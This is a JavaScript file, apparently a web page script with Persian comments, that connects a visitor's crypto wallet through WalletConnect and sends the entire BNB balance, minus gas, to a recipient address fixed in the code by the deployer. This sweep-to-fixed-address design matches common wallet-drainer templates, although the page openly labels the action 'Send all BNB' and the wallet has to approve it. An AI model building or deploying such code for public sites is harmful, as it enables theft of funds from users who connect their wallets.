import { WalletConnectModal } from '@walletconnect/modal';
import { ethers } from 'ethers';

const projectId = "YOUR_PROJECT_ID"; // ← جایگزین کن با WalletConnect Cloud Project ID
const targetAddress = "0xYourTargetAddress"; // ← آدرس گیرنده BNB

const modal = new WalletConnectModal({
  projectId,
  metadata: {
    name: "BNB Sender App",
    description: "Send all BNB using WalletConnect",
    url: "https://yourdomain.com",
    icons: ["https://walletconnect.com/walletconnect-logo.png"]
  }
});

let session;
let provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
let userAddress = null;
let client;

document.getElementById("connectBtn").addEventListener("click", async () => {
  try {
    await modal.openModal();
    session = await modal.connect();
    client = await modal.getSignClient();
    userAddress = session.namespaces.eip155.accounts[0].split(":")[2];
    document.getElementById("address").textContent = userAddress;

    const balance = await provider.getBalance(userAddress);
    const bnb = ethers.formatEther(balance);
    document.getElementById("balance").textContent = `${bnb} BNB`;

    document.getElementById("sendAllBtn").disabled = false;
  } catch (err) {
    alert("Connection failed: " + (err?.message || err));
  }
});

document.getElementById("sendAllBtn").addEventListener("click", async () => {
  try {
    const balance = await provider.getBalance(userAddress);
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice;
    const gasLimit = 21000n;
    const gasCost = gasLimit * gasPrice;
    const amountToSend = balance - gasCost;

    if (amountToSend <= 0n) {
      alert("Not enough BNB to send");
      return;
    }

    const tx = {
      from: userAddress,
      to: targetAddress,
      value: `0x${amountToSend.toString(16)}`,
      gas: `0x${gasLimit.toString(16)}`,
      gasPrice: `0x${gasPrice.toString(16)}`
    };

    const result = await client.request({
      topic: session.topic,
      chainId: "eip155:56",
      request: {
        method: "eth_sendTransaction",
        params: [tx]
      }
    });

    alert("Transaction sent: " + result);
  } catch (err) {
    alert("Transaction failed: " + (err?.message || err));
  }
});